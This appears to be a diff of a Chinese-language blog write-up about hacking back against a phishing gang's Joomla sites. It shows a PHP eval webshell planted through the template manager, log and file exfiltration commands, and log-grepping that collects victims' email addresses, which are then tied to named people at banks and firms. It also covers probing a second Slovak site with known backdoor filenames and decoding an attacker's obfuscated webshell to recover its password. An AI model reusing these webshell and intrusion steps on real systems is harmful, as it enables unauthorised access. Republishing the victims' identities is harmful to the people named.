-</code></pre><p><img src="https://camo.githubusercontent.com/10f01d18e5f466489ec82be2f3f2ce7b7e90b267/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f656d717672677171336c6d76667a397230736e61666f6c6c2f6a6f6f6d6c612d6d616e61676572312e706e67" alt="joomla-manager1.png-132.6kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/10f01d18e5f466489ec82be2f3f2ce7b7e90b267/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f656d717672677171336c6d76667a397230736e61666f6c6c2f6a6f6f6d6c612d6d616e61676572312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/10f01d18e5f466489ec82be2f3f2ce7b7e90b267/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f656d717672677171336c6d76667a397230736e61666f6c6c2f6a6f6f6d6c612d6d616e61676572312e706e67" alt="joomla-manager1.png-132.6kB" />
+</a></p>
 <p>登录后台，通过模板写入WebShell</p>
 <blockquote>
 <p>Extensions &mdash;&gt; Template Manager &mdash;&gt; Template &mdash;&gt; New Files &mdash;&gt; PHP WebSehll</p>
 </blockquote>
-<p><img src="https://camo.githubusercontent.com/810997b0abe5948c060ba41b4a0384108e964ba4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f703261756e62387a65316935396831326a6579756a70326e2f6a6f6f6d6c612d6765747368656c6c312e706e67" alt="joomla-getshell1.png-83.2kB"> 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。</p>
+<p><a href="https://camo.githubusercontent.com/810997b0abe5948c060ba41b4a0384108e964ba4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f703261756e62387a65316935396831326a6579756a70326e2f6a6f6f6d6c612d6765747368656c6c312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/810997b0abe5948c060ba41b4a0384108e964ba4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f703261756e62387a65316935396831326a6579756a70326e2f6a6f6f6d6c612d6765747368656c6c312e706e67" alt="joomla-getshell1.png-83.2kB" />
+</a> 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。</p>
 <pre><code>&lt;?php @eval($_POST['cmd']);?&gt;
-</code></pre><p><img src="https://camo.githubusercontent.com/80c66b50852ff17c263e8486497c82e008a692d8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f787736676470626d7a3472753168357a71346e73737172332f323031382d31312d323925323031332d30342d34332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-11-29 13-04-43屏幕截图.png-140.1kB"></p>
-<p>查看攻击者的钓鱼文件目录，<code>user.txt</code> 详细记录了上钩的受害者信息。 <img src="https://camo.githubusercontent.com/3464c9bb4b262872029448fd0c9000d691713d0d/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3732726531386230697377357a6777676e776678616b6a692f726f73747275706c6173742e636f6d2d757365722e7478742d2e706e67" alt="rostruplast.com-user.txt-.png-138kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/80c66b50852ff17c263e8486497c82e008a692d8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f787736676470626d7a3472753168357a71346e73737172332f323031382d31312d323925323031332d30342d34332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/80c66b50852ff17c263e8486497c82e008a692d8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f787736676470626d7a3472753168357a71346e73737172332f323031382d31312d323925323031332d30342d34332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-11-29 13-04-43屏幕截图.png-140.1kB" />
+</a></p>
+<p>查看攻击者的钓鱼文件目录，<code>user.txt</code> 详细记录了上钩的受害者信息。 <a href="https://camo.githubusercontent.com/3464c9bb4b262872029448fd0c9000d691713d0d/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3732726531386230697377357a6777676e776678616b6a692f726f73747275706c6173742e636f6d2d757365722e7478742d2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/3464c9bb4b262872029448fd0c9000d691713d0d/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3732726531386230697377357a6777676e776678616b6a692f726f73747275706c6173742e636f6d2d757365722e7478742d2e706e67" alt="rostruplast.com-user.txt-.png-138kB" />
+</a></p>
 <h3 id="34-日志分析"><strong>3.4 日志分析</strong></h3>
 <p>将网站文件和访问日志下载到本地分析</p>
 <pre><code>[/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/log.tar.gz /var/www/rosturpl/data/access-logs /var/www/rosturpl/data/logs/rosturplast*
@@ -313,8 +323,13 @@ wget -c http://www.rosturplast.com/log.tar.gz &amp;&amp; wget -c http://www.rost
 -rw-rw---- 1 48 6313 550K 11月 28 08:35 rosturplast.com.error.log-20181128
 -rw-rw---- 1 48 6313 6.5M 11月 29 07:51 rosturplast.com.error.log-20181129
 -rw-rw---- 1 48 6313 1.4M 11月 30 08:38 rosturplast.com.error.log-20181130
-</code></pre><p>用D盾扫网站文件，发现这个网站已成跑马场。 <img src="https://camo.githubusercontent.com/83e5501754f57697062e2425370decab4fbbdc0f/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6566693166796e35697639786b376e3634357a7a6a386a302f323031382d31312d333025323031372d30302d32382545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-11-30 17-00-28屏幕截图.png-59.9kB"></p>
-<p><strong>攻击者在<code>shells/</code>目录下放置钓鱼文件和PHP后门。</strong> <img src="https://camo.githubusercontent.com/9a4f890d71c4c578640b1d3dad63fb24a34b4e61/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d3270776b39386b323873397979327371307635716635702f726f73747572706c6173742e636f6d2d7368656c6c732d6c732e706e67" alt="rosturplast.com-shells-ls.png-306.7kB"></p>
+</code></pre>
+<p>用D盾扫网站文件，发现这个网站已成跑马场。 <a href="https://camo.githubusercontent.com/83e5501754f57697062e2425370decab4fbbdc0f/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6566693166796e35697639786b376e3634357a7a6a386a302f323031382d31312d333025323031372d30302d32382545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/83e5501754f57697062e2425370decab4fbbdc0f/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6566693166796e35697639786b376e3634357a7a6a386a302f323031382d31312d333025323031372d30302d32382545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-11-30 17-00-28屏幕截图.png-59.9kB" />
+</a></p>
+<p><strong>攻击者在<code>shells/</code>目录下放置钓鱼文件和PHP后门。</strong> <a href="https://camo.githubusercontent.com/9a4f890d71c4c578640b1d3dad63fb24a34b4e61/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d3270776b39386b323873397979327371307635716635702f726f73747572706c6173742e636f6d2d7368656c6c732d6c732e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/9a4f890d71c4c578640b1d3dad63fb24a34b4e61/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d3270776b39386b323873397979327371307635716635702f726f73747572706c6173742e636f6d2d7368656c6c732d6c732e706e67" alt="rosturplast.com-shells-ls.png-306.7kB" />
+</a></p>
 <p><strong>查看哪些IP访问了后门并统计次数</strong></p>
 <p><strong>查询攻击者IP地址</strong></p>
 <pre><code> ⚡ root@kali  /tmp/rosturplast.com/log  grep &quot;/shells/&quot; * |grep &quot;php&quot; | awk -F &quot;:&quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]&quot; &quot;i;}}' |sort -t &quot; &quot; -k 1 -n -r  &gt;ip.txt
@@ -333,7 +348,8 @@ IP: 213.233.104.120 来自: 罗马尼亚
 IP: 207.228.149.69 来自: 百慕大 
 IP: 195.211.23.207 来自: 俄罗斯 
 IP: 129.205.113.8 来自: 尼日利亚
-</code></pre><p><strong>根据后门文件名，匹配Apache访问日志得到攻击者的代理IP和User Agent</strong></p>
+</code></pre>
+<p><strong>根据后门文件名，匹配Apache访问日志得到攻击者的代理IP和User Agent</strong></p>
 <pre><code> ⚡ root@kali  /tmp  grep &quot;/shells&quot; *| grep &quot;php&quot; |grep &quot;POST&quot; |awk -F &quot;:&quot; '{print $2 $6}' |sort |uniq
  
 129.205.113.8 - - [30/Nov/2018//www.rosturplast.com/shells/config.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&quot;
@@ -341,7 +357,8 @@ IP: 129.205.113.8 来自: 尼日利亚
 207.228.149.69 - - [28/Nov/2018//www.rosturplast.com/shells/config.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;
 213.233.104.120 - - [27/Nov/2018//www.rosturplast.com/shells//bacu.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv
 50.73.252.169 - - [29/Nov/2018//www.rosturplast.com/shells/config.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;
-</code></pre><p><strong>通过日志匹配邮箱并去重得到受害者邮箱地址</strong></p>
+</code></pre>
+<p><strong>通过日志匹配邮箱并去重得到受害者邮箱地址</strong></p>
 <pre><code>egrep '[0-Z_]{1,}@[0-Z]{1,}(\.[0-Z]{1,})+' *  | awk -F &quot;\&quot;&quot; '{print $2}' |awk -F &quot;HTTP&quot; '{print $1}' |awk -F &quot;ml=&quot; '{print $2}' |sort |uniq
  ⚡ root@kali  /tmp  egrep '[0-Z_]{1,}@[0-Z]{1,}(\.[0-Z]{1,})+' *  | awk -F &quot;\&quot;&quot; '{print $2}' |awk -F &quot;HTTP&quot; '{print $1}' |awk -F &quot;ml=&quot; '{print $2}' |sort |uniq
 
@@ -359,7 +376,8 @@ philip@beekoo.hk                //深圳市很有蜂格网络科技有限公司C
 Point72.IR@sscinc.com           //美国SS&amp;C Technologies, Inc.
 shunweicapital@sscinc.com       //美国SS&amp;C Technologies, Inc.（疑似顺为资本）
 url@email.com                   //无效
-</code></pre><hr>
+</code></pre>
+<hr>
 <h3 id="35-受害者身份识别">3.5 受害者身份识别</h3>
 <p>通过搜索引擎对这15个受害者邮箱进行身份识别。</p>
 <h4 id="351-alexsin54yahoocommailtoalexsin54yahoocom--jasonchowan223gmailcommailtojasonchowan223gmailcom">3.5.1 <a href="mailto:alexsin54@yahoo.com">alexsin54@yahoo.com</a> / <a href="mailto:jasonchowan223@gmail.com">jasonchowan223@gmail.com</a></h4>
@@ -370,13 +388,21 @@ url@email.com                   //无效
 </blockquote>
 <blockquote>
 <blockquote>
-<p>来源：http://www.payer.org/test/ 来源：https://avoidaclaim.com/2018/debt-collection-fraud-using-the-name-yeung-alexander-luk/ <img src="https://camo.githubusercontent.com/2d6cd91991c67a8b9157ef3633c7974fd33fb988/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3774653876653538746765317472656f78766276387075702f616c657873696e3534407961686f6f2e636f6d2d2545362541432542412545382541462538382545382542342541362545362538382542372e706e67" alt="alexsin54@yahoo.com-欺诈账户.png-124.7kB"> <img src="https://camo.githubusercontent.com/609e25fceb042f012c07f1f8a11b6da8c5e0e292/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f71627833377631696e30306b6f7436366662386b6a7877692f616c657873696e3534407961686f6f2e636f6d2d254536254143254241254538254146253838254538254234254136254536253838254237322e706e67" alt="alexsin54@yahoo.com-欺诈账户2.png-196.4kB"></p>
+<p>来源：http://www.payer.org/test/ 来源：https://avoidaclaim.com/2018/debt-collection-fraud-using-the-name-yeung-alexander-luk/ <a href="https://camo.githubusercontent.com/2d6cd91991c67a8b9157ef3633c7974fd33fb988/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3774653876653538746765317472656f78766276387075702f616c657873696e3534407961686f6f2e636f6d2d2545362541432542412545382541462538382545382542342541362545362538382542372e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/2d6cd91991c67a8b9157ef3633c7974fd33fb988/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3774653876653538746765317472656f78766276387075702f616c657873696e3534407961686f6f2e636f6d2d2545362541432542412545382541462538382545382542342541362545362538382542372e706e67" alt="alexsin54@yahoo.com-欺诈账户.png-124.7kB" />
+</a> <a href="https://camo.githubusercontent.com/609e25fceb042f012c07f1f8a11b6da8c5e0e292/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f71627833377631696e30306b6f7436366662386b6a7877692f616c657873696e3534407961686f6f2e636f6d2d254536254143254241254538254146253838254538254234254136254536253838254237322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/609e25fceb042f012c07f1f8a11b6da8c5e0e292/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f71627833377631696e30306b6f7436366662386b6a7877692f616c657873696e3534407961686f6f2e636f6d2d254536254143254241254538254146253838254538254234254136254536253838254237322e706e67" alt="alexsin54@yahoo.com-欺诈账户2.png-196.4kB" />
+</a></p>
 </blockquote>
 </blockquote>
 <h4 id="352-clavendapaymanlbdinetmailtoclavendapaymanlbdinet">3.5.2 <a href="mailto:clavenda.payman@lbdi.net">clavenda.payman@lbdi.net</a></h4>
 <blockquote>
 <blockquote>
-<p>Mrs. Clavenda O. PAYMAN 利比亚发展投行（Liberian Bank forDevelopment and nvestment）首席财务官 来源：https://www.adfi-ci.org/downloads/telecharger.php?Fichier_a_telecharger=files/aadfi_doc_en_20130623170205.pdf&amp;chemin=&amp;id=91 <img src="https://camo.githubusercontent.com/fa369fd05fb3df0edb2e53be3fbe0a086922ff77/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f347439687a746c307a6178627835707030343139773575382f636c6176656e64612e7061796d616e406c6264692e6e65742d312e706e67" alt="clavenda.payman@lbdi.net-1.png-86kB"> <img src="https://camo.githubusercontent.com/93048eb1aaf1f94e5a0fcf5bdaa3fc09cda64f22/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63797a71396c66687735746135716764693578786e6d6c662f636c6176656e64612e7061796d616e406c6264692e6e65742d322e706e67" alt="clavenda.payman@lbdi.net-2.png-169.6kB"></p>
+<p>Mrs. Clavenda O. PAYMAN 利比亚发展投行（Liberian Bank forDevelopment and nvestment）首席财务官 来源：https://www.adfi-ci.org/downloads/telecharger.php?Fichier_a_telecharger=files/aadfi_doc_en_20130623170205.pdf&amp;chemin=&amp;id=91 <a href="https://camo.githubusercontent.com/fa369fd05fb3df0edb2e53be3fbe0a086922ff77/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f347439687a746c307a6178627835707030343139773575382f636c6176656e64612e7061796d616e406c6264692e6e65742d312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/fa369fd05fb3df0edb2e53be3fbe0a086922ff77/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f347439687a746c307a6178627835707030343139773575382f636c6176656e64612e7061796d616e406c6264692e6e65742d312e706e67" alt="clavenda.payman@lbdi.net-1.png-86kB" />
+</a> <a href="https://camo.githubusercontent.com/93048eb1aaf1f94e5a0fcf5bdaa3fc09cda64f22/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63797a71396c66687735746135716764693578786e6d6c662f636c6176656e64612e7061796d616e406c6264692e6e65742d322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/93048eb1aaf1f94e5a0fcf5bdaa3fc09cda64f22/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63797a71396c66687735746135716764693578786e6d6c662f636c6176656e64612e7061796d616e406c6264692e6e65742d322e706e67" alt="clavenda.payman@lbdi.net-2.png-169.6kB" />
+</a></p>
 </blockquote>
 </blockquote>
 <h4 id="353-georgesraadneranetmailtogeorgesraadneranet">3.5.3 <a href="mailto:georges.raad@nera.net">georges.raad@nera.net</a></h4>
@@ -393,7 +419,9 @@ url@email.com                   //无效
 </blockquote>
 <blockquote>
 <blockquote>
-<p>来源： [http://www.seepz.gov.in/writereaddatafolder/Regional%20Governing%20Council%20of%20EPCES%20for%202016-18.pdf](<a href="http://www.seepz.gov.in/writereaddatafolder/Regional">http://www.seepz.gov.in/writereaddatafolder/Regional</a> Governing Council of EPCES for 2016-18.pdf) <img src="https://camo.githubusercontent.com/656310c98999c25975f5b90c343ad66350a470c8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a727078696b6169326a306a7473716273713632337663332f677468616b6b617240737363696e632e636f6d312e706e67" alt="gthakkar@sscinc.com1.png-169.5kB"></p>
+<p>来源： [http://www.seepz.gov.in/writereaddatafolder/Regional%20Governing%20Council%20of%20EPCES%20for%202016-18.pdf](<a href="http://www.seepz.gov.in/writereaddatafolder/Regional">http://www.seepz.gov.in/writereaddatafolder/Regional</a> Governing Council of EPCES for 2016-18.pdf) <a href="https://camo.githubusercontent.com/656310c98999c25975f5b90c343ad66350a470c8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a727078696b6169326a306a7473716273713632337663332f677468616b6b617240737363696e632e636f6d312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/656310c98999c25975f5b90c343ad66350a470c8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a727078696b6169326a306a7473716273713632337663332f677468616b6b617240737363696e632e636f6d312e706e67" alt="gthakkar@sscinc.com1.png-169.5kB" />
+</a></p>
 </blockquote>
 </blockquote>
 <h4 id="355-jiajielimcimbcommailtojiajielimcimbcom">3.5.5 <a href="mailto:jiajie.lim@cimb.com">jiajie.lim@cimb.com</a></h4>
@@ -410,13 +438,17 @@ url@email.com                   //无效
 </blockquote>
 <blockquote>
 <blockquote>
-<p>来源：https://www.bdo.com.sg/en-gb/our-people/koh-chin-beng <img src="https://camo.githubusercontent.com/d1ec2881944f4d08a06d1e2db88665e16500cb49/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f336f6f37767a75717866387a73346130776c316d3432726a2f6b6f686368696e62656e674062646f2e636f6d2e73672d312e706e67" alt="kohchinbeng@bdo.com.sg-1.png-263.7kB"></p>
+<p>来源：https://www.bdo.com.sg/en-gb/our-people/koh-chin-beng <a href="https://camo.githubusercontent.com/d1ec2881944f4d08a06d1e2db88665e16500cb49/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f336f6f37767a75717866387a73346130776c316d3432726a2f6b6f686368696e62656e674062646f2e636f6d2e73672d312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/d1ec2881944f4d08a06d1e2db88665e16500cb49/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f336f6f37767a75717866387a73346130776c316d3432726a2f6b6f686368696e62656e674062646f2e636f6d2e73672d312e706e67" alt="kohchinbeng@bdo.com.sg-1.png-263.7kB" />
+</a></p>
 </blockquote>
 </blockquote>
 <h4 id="357-philipbeekoohkmailtophilipbeekoohk">3.5.7 <a href="mailto:philip@beekoo.hk">philip@beekoo.hk</a></h4>
 <blockquote>
 <blockquote>
-<p>深圳市很有蜂格网络科技有限公司 CEO 来源：https://m.zhipin.com/job_detail/1407383492.html 来源：https://www.tianyancha.com/company/2349004659 <img src="https://camo.githubusercontent.com/ae11cf0cea5616cb7ebe59fa32322eac7fe35473/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7964623361376f306e35356a33713832776f6478657431672f7068696c6970406265656b6f6f2e686b2d312e706e67" alt="philip@beekoo.hk-1.png-101.3kB"></p>
+<p>深圳市很有蜂格网络科技有限公司 CEO 来源：https://m.zhipin.com/job_detail/1407383492.html 来源：https://www.tianyancha.com/company/2349004659 <a href="https://camo.githubusercontent.com/ae11cf0cea5616cb7ebe59fa32322eac7fe35473/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7964623361376f306e35356a33713832776f6478657431672f7068696c6970406265656b6f6f2e686b2d312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/ae11cf0cea5616cb7ebe59fa32322eac7fe35473/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7964623361376f306e35356a33713832776f6478657431672f7068696c6970406265656b6f6f2e686b2d312e706e67" alt="philip@beekoo.hk-1.png-101.3kB" />
+</a></p>
 </blockquote>
 </blockquote>
 <h2 id="四渗透邮件发送网站">四、渗透邮件发送网站</h2>
@@ -427,11 +459,17 @@ url@email.com                   //无效
 <h3 id="41-漏洞扫描"><strong>4.1 漏洞扫描</strong></h3>
 <p>服务器信息如下:</p>
 <blockquote>
-<p>[+] HOST: mirohaviar.sk（85.248.229.150 斯洛伐克） [+] OS: Debian 7 [+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16 [+] CMS: Joomla 1.5 <img src="https://camo.githubusercontent.com/9ac926c8d659617a37c00a42a73ebcf8d697c1bf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6563626c63756e616875626973737a36676863386f6970742f6e6d61702d6d69726f6861766961722e736b2d312e706e67" alt="nmap-mirohaviar.sk-1.png-123.2kB"></p>
+<p>[+] HOST: mirohaviar.sk（85.248.229.150 斯洛伐克） [+] OS: Debian 7 [+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16 [+] CMS: Joomla 1.5 <a href="https://camo.githubusercontent.com/9ac926c8d659617a37c00a42a73ebcf8d697c1bf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6563626c63756e616875626973737a36676863386f6970742f6e6d61702d6d69726f6861766961722e736b2d312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/9ac926c8d659617a37c00a42a73ebcf8d697c1bf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6563626c63756e616875626973737a36676863386f6970742f6e6d61702d6d69726f6861766961722e736b2d312e706e67" alt="nmap-mirohaviar.sk-1.png-123.2kB" />
+</a></p>
 </blockquote>
-<p><img src="https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67" alt="joomscan-1mirohaviar.sk.png-660.5kB"> CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。</p>
+<p><a href="https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67" alt="joomscan-1mirohaviar.sk.png-660.5kB" />
+</a> CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。</p>
 <p>然而有人的地方就有江湖，有黑客入侵过的网站一定有后门。这类利用通用漏洞批量入侵的黑客团伙，后门文件一般都有特征，我根据前一个网站获得的php后门文件名列表，批量访问当前网站得到了三个相同的后门文件。</p>
-<p><img src="https://camo.githubusercontent.com/f170862127885433b06e28df5af6886872986333/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d303834396433697631386f386c396779766a36776f32722f726f73747572706c6173742e636f6d2d7368656c6c732d312e706e67" alt="rosturplast.com-shells-1.png-169.4kB"></p>
+<p><a href="https://camo.githubusercontent.com/f170862127885433b06e28df5af6886872986333/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d303834396433697631386f386c396779766a36776f32722f726f73747572706c6173742e636f6d2d7368656c6c732d312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/f170862127885433b06e28df5af6886872986333/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d303834396433697631386f386c396779766a36776f32722f726f73747572706c6173742e636f6d2d7368656c6c732d312e706e67" alt="rosturplast.com-shells-1.png-169.4kB" />
+</a></p>
 <pre><code> ⚡ root@kali  /tmp/rosturplast.com/webroot/shells  md5sum *         
 724e7316427151ea1f449f38a28f642c  406.php
 3e8a7cf7049e8b9ab8dfca7d3c827c4a  aaaa
@@ -449,11 +487,13 @@ md5sum: logon.secureaccess: 是一个目录
 48f50fb676028e0ae82f3f2db4e26247  unzipper.php
 51f0bba7ec30b8778dca19ead016a58f  webapp365.zip
 58d1d66c0be0739319156702522b1b52  wso.php
-</code></pre><p><strong>相同文件名如下：</strong></p>
+</code></pre>
+<p><strong>相同文件名如下：</strong></p>
 <pre><code>http://www.mirohaviar.sk/config.php
 http://www.mirohaviar.sk/an.php
 http://www.mirohaviar.sk/bacu.php  Pro Mailer V2
-</code></pre><p>其中 <code>http://www.mirohaviar.sk/config.php </code>是攻击者的加密WebShell，理论上只需解密获得密码就能登录这个后门。</p>
+</code></pre>
+<p>其中 <code>http://www.mirohaviar.sk/config.php </code>是攻击者的加密WebShell，理论上只需解密获得密码就能登录这个后门。</p>
 <hr>
 <h3 id="42-解密webshell"><strong>4.2 解密WebShell</strong></h3>
 <p>解密过程如下</p>
@@ -475,10 +515,16 @@ awk -F &quot;\&quot;&quot; '{print $2}' config.php| base64 -d -i|awk -F &quot;\&
 awk -F &quot;\&quot;&quot; '{print $2}' config.php| base64 -d -i|awk -F &quot;\&quot;&quot; '{print $2}' |sed 's/\\x//g' |tr -d '\\' |xxd -r -p |base64 -d -i |awk -F &quot;\&quot;&quot; '{print $2}' |base64 -d -i |awk -F &quot;\&quot;&quot; '{print $2}' |base64 -d -i
 
 //第五次base64解码，得到明文
-</code></pre><p><img src="https://camo.githubusercontent.com/91c831cddedde7575147bfb16062001dc54bc8a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c62656d746a6137617476727635326f787675776b63702f504850254535253930253845254539253937254138254538254137254133254535254146253836254538254246253837254537254138253842312e706e67" alt="PHP后门解密过程1.png-3103.9kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/91c831cddedde7575147bfb16062001dc54bc8a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c62656d746a6137617476727635326f787675776b63702f504850254535253930253845254539253937254138254538254137254133254535254146253836254538254246253837254537254138253842312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/91c831cddedde7575147bfb16062001dc54bc8a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c62656d746a6137617476727635326f787675776b63702f504850254535253930253845254539253937254138254538254137254133254535254146253836254538254246253837254537254138253842312e706e67" alt="PHP后门解密过程1.png-3103.9kB" />
+</a></p>
 <p>得到后门密码hash（MD5），解密后得到明文: root （饶了个大弯原来是个弱口令，下次遇到这类先跑一下密码）</p>
 <pre><code>$auth_pass = &quot;63a9f0ea7bb98050796b649e85481845&quot;;  
-</code></pre><p><img src="https://camo.githubusercontent.com/68009baa8d19ffc87cfa5e7bc1b269ff903adf0e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666e3264347234356872667835393638316a64676576346d2f323031392d30312d323425323031322d32322d34312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-24 12-22-41屏幕截图.png-17.3kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/68009baa8d19ffc87cfa5e7bc1b269ff903adf0e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666e3264347234356872667835393638316a64676576346d2f323031392d30312d323425323031322d32322d34312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/68009baa8d19ffc87cfa5e7bc1b269ff903adf0e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666e3264347234356872667835393638316a64676576346d2f323031392d30312d323425323031322d32322d34312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-24 12-22-41屏幕截图.png-17.3kB" />
+</a></p>
 <p>这个后门有点皮，做了UserAgent判断，我浏览器默认设置的UA是Googlebot，访问显示404，这是反搜索引擎爬虫的惯用手段，所以我换了个正常浏览器的UA访问得到正常页面。</p>
 <pre><code>if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array(&quot;Google&quot;, &quot;Slurp&quot;, &quot;MSNBot&quot;, &quot;ia_archiver&quot;, &quot;Yandex&quot;, &quot;Rambler&quot;);
@@ -487,16 +533,24 @@ awk -F &quot;\&quot;&quot; '{print $2}' config.php| base64 -d -i|awk -F &quot;\&
         exit;
     }
 }
-</code></pre><p><img src="https://camo.githubusercontent.com/c745fab220976e1a2be673b1a1e15b9f5a8b3bca/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f31326a6e6e356b6d646c3531656939693569757375636a752f6d69726f6861766961722e736b2d636f6e6669672e7068702d7368656c6c2e706e67" alt="mirohaviar.sk-config.php-shell.png-13.4kB"></p>
